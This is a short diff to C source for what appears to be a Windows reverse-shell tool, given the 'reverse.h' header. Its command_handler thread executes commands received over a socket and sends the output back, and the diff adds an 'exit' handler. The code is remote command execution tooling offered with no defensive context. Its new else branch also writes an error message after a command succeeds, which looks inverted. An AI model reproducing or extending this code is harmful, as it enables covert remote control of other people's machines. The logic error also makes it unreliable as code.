@@ -1,11 +1,22 @@
 #include "../header/reverse.h"
 
+int is_command(char * cmd)
+{
+	if(my_strcmp(cmd, "exit"))
+		return 1;
+	return 0;
+}
+
 DWORD WINAPI command_handler(void *inf)
 {
 	struct main_struct * m_s = (struct main_struct*)inf;		// retreive the struct pointer
-
-	if(exe(m_s) < 0) {		// execute the given command.
+	if(is_command(m_s->cmd) == 1) {
+		process_command(m_s);
+	} else if(exe(m_s) < 0) {		// execute the given command.
 		printf("cant use program");
+	} else {
+		m_s->buf = malloc(1024 * sizeof(char));
+		sprintf(m_s->buf, "Error: type exit to reboot the connection");
 	}
 	sender(m_s->s, m_s->buf, strlen(m_s->buf), &m_s->cn);		// send output
 	free(m_s->buf);							// free the allocated output.
